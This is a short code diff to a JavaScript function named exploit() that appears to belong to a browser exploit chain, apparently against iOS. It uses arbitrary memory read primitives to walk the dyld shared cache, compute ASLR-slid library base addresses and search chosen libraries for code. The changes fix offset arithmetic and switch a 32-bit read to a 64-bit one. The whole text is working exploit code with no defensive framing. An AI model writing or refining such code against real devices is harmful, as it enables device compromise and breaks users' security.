@@ -655,16 +655,16 @@ function exploit(){
         alert("number of cache libs=" + nimgs);
         for(var i = 0; i < nimgs; ++i)
         {
-            var straddr = off2addr(segs, memory.u32(Add(imgs,i * 0x20 + 0x18)));
+            var straddr = off2addr(segs, memory.u32(Add(imgs,Add(i * 0x20, 0x18))));
             var fn = function(i)
             {
                 return memory.read(Add(straddr, i), 1)[0];
             };
-            var base = Add(memory.read_i32(Add(imgs ,i * 0x20),0),slide);
+            var base = Add(memory.read_i64(Add(imgs ,i * 0x20),0),slide);
             alert(base)
             //alert("r32"+Add(r32(Add(imgs, i * 0x20),cache_slide)))
-            log(fn())
-            if(opcode_libs.some(lib => strcmp(fn(), lib)))
+            log(fn(i))
+            if(opcode_libs.some(lib => strcmp(fn(i), lib)))
             {
                 alert("...")
                 var ncmds = memory.u32(Add(base, 0x10));
